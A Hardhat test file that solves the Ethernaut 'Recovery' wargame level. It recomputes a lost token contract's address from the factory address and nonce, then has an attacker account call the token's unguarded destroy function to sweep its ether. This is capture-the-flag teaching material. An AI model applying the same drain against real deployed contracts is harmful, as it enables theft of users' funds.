import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { toWei } from "scripts/utils";
import { Recovery } from "typechain-types";

// Challenge description

// A contract creator has built a very simple token factory contract.
// Anyone can create new tokens with ease. After deploying the first token contract,
// the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

// This level will be completed if you can recover (or remove) the 0.001 ether
// from the lost contract address.

describe("Ethernaut - Recovery", async () => {
  let recovery: Recovery;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    recovery = await ethers
      .getContractFactory("Recovery", owner)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    await recovery.connect(owner).generateToken("LostCoin", toWei("1000000"));

    const address = ethers.utils.getContractAddress({
      from: recovery.address,
      nonce: 1,
    });

    await owner.sendTransaction({
      to: address,
      value: ethers.utils.parseEther("0.001"),
    });

    // Owner forgets the address of token

    // anybody can find out the address of contract
    // knowing the address of recovery contract and iterating through nonce
    // as on line 35
    const token = await ethers.getContractAt("SimpleToken", address);

    const randomAddress = ethers.Wallet.createRandom().address;

    expect(await ethers.provider.getBalance(randomAddress)).equal(0);

    await token.connect(attacker).destroy(randomAddress);

    expect(await ethers.provider.getBalance(token.address)).equal(0);
    expect(await ethers.provider.getBalance(randomAddress)).equal(
      ethers.utils.parseEther("0.001"),
    );
  });
});
